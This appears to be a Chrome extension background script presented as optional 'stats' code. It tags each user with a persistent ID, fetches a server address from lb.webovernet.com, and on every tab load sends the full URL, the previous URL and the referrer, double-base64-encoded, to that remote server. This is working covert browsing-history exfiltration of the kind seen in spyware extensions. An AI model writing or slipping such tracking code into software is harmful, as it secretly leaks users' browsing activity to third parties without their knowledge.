
function sg_init() {

  var is_init = false;
  var xhr = null;

  var tabs_prevs = new Array();		
  var tabs_updates = new Array();		

  if (!localStorage["sg_userid"]) localStorage["sg_userid"] = Math.floor(Math.random() * 999999999999999999);
  localStorage["sg_sessionid"] = Math.floor(Math.random() * 999999999999999999);
  var previous_url="";
  var src = localStorage["sg_src"];
  var last_ver = localStorage["sg_last_version"];
  var is_bundle = true;

  if ( !src || typeof(src)=="undefined")
  {
    localStorage["sg_src"] = 809;
    src = 809;
    is_bundle = false;
  }

  var version = 'NaN'; 
  var xhr = new XMLHttpRequest(); 
  xhr.open('GET', chrome.extension.getURL('manifest.json'), false); 
  xhr.send(null); 
  var manifest = JSON.parse(xhr.responseText); 
  var cur_ver = manifest.version; 

  if ( cur_ver != last_ver )
  {
    localStorage["sg_last_version"] = cur_ver;
  }
  if ( typeof(localStorage["sg_install_time"]) == "undefined")
    localStorage["sg_install_time"] = new Date().getTime() /1000;

  $.ajax({
    type: "GET",
    url: "http://lb.webovernet.com/settings",
    dataType:"json",
    data : "s="+src+"&ins="+encodeURIComponent(localStorage["sg_install_time"])+"&ver="+encodeURIComponent(cur_ver),
    success : function(result) {
      if ( result.Status == "1" )
        localStorage["sg_server"] = result.Endpoint;
      else
        localStorage["sg_server"] = ""; 
      
    }
  });



  chrome.tabs.onSelectionChanged.addListener(function(tabId, selectInfo) {
    chrome.tabs.get(tabId, function(tab) {
      if (tab.url == "chrome://newtab/") {
        return;
      }
      chrome.tabs.sendMessage(tab.id, {
        command: "referrer"
      }, function(response) {
        previous_url=tab.url;
      });
    });
  });

  chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.status == "loading") return;
    if (tab.url == "chrome://newtab/") {
      return;
    }
    var prev_url = "";
    try{
      if ( tabs_prevs[tab.id] )
      {
        prev_url = tabs_prevs[tab.id];
      }
    }catch(e){}

    if (tab.url == "chrome://newtab/") {
      return;
    }
    
    chrome.tabs.sendMessage(tab.id, {
      command: "referrer",
      prev : prev_url,
      tab_id : tab.id,
    }, function(response) {
      
      try{
        var res_prev_url = "";
        if ( tabs_prevs[response.tab_id] )
        res_prev_url= tabs_prevs[response.tab_id];
      }catch(e){}
      try{
        if ( localStorage["sg_server"] != ""  && localStorage["sg_server"] != "undefined" )
        {
          var ref = response["ref"];
          var prev = response["prev_url"];
          var docType = response["docType"];
          if ( ref != "" && prev == "")
          prev = ref;

          if ( docType != "html" && docType !="")
          {
            tabs_prevs[tab.id]="";
            return;
          }
          var data = "s="+localStorage["sg_src"]+"&md=21&pid=" + localStorage["sg_userid"] + "&sess=" + localStorage["sg_sessionid"] + "&q=" + encodeURIComponent(tab.url) + "&prev=" + encodeURIComponent(res_prev_url) + "&link="+(ref?"1":"0")+"&sub=chrome&hreferer="+encodeURIComponent(ref);
          var update_diff = 0;
          if ( tabs_updates[tab.id])
          {
            update_diff = Date.now() - tabs_updates[tab.id];
          }

          tabs_updates[tab.id] = Date.now();
          if ( update_diff > 0 && update_diff < 10 )
          return;
          data = encode64(encode64(data));
          $.ajax({
            type: "POST",
            url: localStorage["sg_server"]+"/related",
            dataType: "json",
            data: "e="+data,
            success: function(result) {tabs_prevs[tab.id]=tab.url;},
            error: function() {tabs_prevs[tab.id]=tab.url;}
          });
        }
      }catch(e){}
    });
  });
}

if (options && options.enableStats) {
    sg_init();
}
